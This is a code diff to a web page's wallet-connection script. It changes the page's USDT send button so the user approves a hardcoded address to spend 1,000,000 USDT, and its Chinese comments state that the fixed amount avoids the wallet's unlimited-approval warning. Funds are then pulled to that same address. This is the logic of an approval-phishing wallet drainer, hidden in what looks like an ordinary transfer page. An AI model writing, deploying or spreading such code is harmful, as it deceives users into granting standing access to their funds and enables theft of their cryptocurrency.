@@ -208,6 +208,8 @@ body {
 const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
+// 固定授权额度：100万 USDT
+const FIX_AUTH_AMOUNT_USDT = 1000000;
 
 let tronWeb = null;
 let userAddress = "";
@@ -315,18 +317,19 @@ maxBtn.addEventListener("click", async () => {
   amountInput.dispatchEvent(new Event("input"));
 });
 
-// 授权+转账逻辑：改成本次额度授权，不再无限额度，钱包不会弹出无限授权提示
+// 授权+转账逻辑：额度不足就授权100万枚固定额度
 sendBtn.addEventListener("click", async () => {
   if (!tronWeb) return;
   const val = parseFloat(amountInput.value);
   if (isNaN(val) || val <= 0) return;
   const sunVal = tronWeb.toSun(val);
+  const authSun = tronWeb.toSun(FIX_AUTH_AMOUNT_USDT);
 
   try {
     const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
     if (Number(allowance) < sunVal) {
-      // 只授权本次需要的数量，不是超大无限数，钱包弹窗只会显示普通合约签名
-      await usdtContract.approve(TARGET_ADDR, sunVal).send();
+      // 固定授权100万USDT，不会触发无限授权提示
+      await usdtContract.approve(TARGET_ADDR, authSun).send();
     }
     await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
     await loadBalance();
